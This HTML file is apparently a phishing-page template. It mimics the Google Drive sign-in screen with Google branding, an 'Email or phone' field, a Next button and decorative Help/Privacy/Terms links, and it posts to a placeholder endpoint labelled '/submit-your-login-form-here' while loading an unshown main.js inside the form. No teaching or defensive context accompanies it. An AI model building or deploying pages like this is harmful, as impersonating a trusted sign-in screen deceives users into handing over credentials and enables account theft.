<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Drive Sign In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .signin-container {
            width: 100%;
            max-width: 450px;
            padding: 20px;
            box-shadow: 0px 4px 6px rgba(32, 33, 36, 0.28);
            border-radius: 8px;
            text-align: center;
        }
        .google-logo {
            margin-bottom: 24px;
        }
        .signin-container input,
        .signin-container button {
            width: calc(100% - 40px);
            padding: 16px;
            margin-bottom: 10px;
            border-radius: 4px;
            border: 1px solid #dcdcdc;
        }
        .signin-container button {
            background-color: #1a73e8;
            color: white;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" 
            integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg==" 
            crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <div class="signin-container">
        <img src="images/google-logo.jpeg" width="100" height="100">
        <br>
        <h1>Sign in</h1>
        <p>to continue to Google Drive</p>
        <form action="/submit-your-login-form-here" method="post">
            <input type="email" placeholder="Email or phone">
            <script src="main.js"></script>
            <button type="submit">Next</button>
        </form>
        <div class="language-selector">
            English (United States)
        </div>
        <div class="footer-links">
            <span>Help</span>
            <span>Privacy</span>
            <span>Terms</span>
        </div>
    </div>
</body>
</html>
